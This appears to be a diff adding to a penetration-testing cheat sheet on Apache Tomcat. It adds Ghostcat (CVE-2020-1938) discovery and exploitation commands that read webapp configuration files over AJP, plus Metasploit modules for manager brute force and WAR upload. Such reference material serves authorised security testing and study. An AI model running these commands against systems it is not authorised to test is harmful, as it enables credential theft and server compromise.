@@ -133,6 +133,38 @@ id
 uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 ```
 
+---
+
+## Ghostcat (CVE-2020-1938)
+
+**Affects:** Tomcat < 9.0.31, < 8.5.51, < 7.0.100
+
+AJP protocol misconfiguration allows LFI on webapps folder.
+
+### Discovery
+
+```bash
+# Check for AJP port (8009)
+nmap -sV -p 8009,8080 TARGET
+```
+
+### Exploitation
+
+```bash
+# Download PoC
+git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+
+# Read WEB-INF/web.xml
+python2.7 tomcat-ajp.lfi.py TARGET -p 8009 -f WEB-INF/web.xml
+
+# Read other webapp files
+python2.7 tomcat-ajp.lfi.py TARGET -p 8009 -f WEB-INF/classes/application.properties
+```
+
+**Note:** Can only read files within web apps folder, not `/etc/passwd`
+
+---
+
 ### Easy Pwns&#x20;
 
 #### Apache Tomcat Metasploit
@@ -141,3 +173,18 @@ uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
 * **OS**: Microsoft Windows 2008| Vista | 7
 * **exploit**: multi/http/struts2\_rest\_xstream
 * **Targeturi**: /struts2-rest-showcase/orders/
+
+---
+
+## Metasploit Modules
+
+```bash
+# Manager brute force
+use auxiliary/scanner/http/tomcat_mgr_login
+
+# WAR upload (auth required)
+use exploit/multi/http/tomcat_mgr_upload
+
+# Ghostcat
+use auxiliary/admin/http/tomcat_ghostcat
+```
